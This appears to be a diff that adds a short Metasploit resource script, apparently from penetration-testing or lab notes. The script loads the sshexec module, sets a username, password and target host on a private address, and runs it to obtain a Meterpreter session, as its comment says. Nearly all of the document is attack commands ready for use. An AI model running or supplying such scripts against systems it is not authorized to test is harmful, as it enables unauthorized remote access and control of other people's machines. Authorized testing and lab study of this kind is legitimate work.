@@ -1,0 +1,9 @@
+# You obtain a METERPRETER if that, but you
+# need PASSWORD and USERNAME
+
+use exploit/multi/ssh/sshexec
+set USERNAME user
+set PASSWORD password
+set RHOST 192.168.0.104
+set RPORT 22
+run
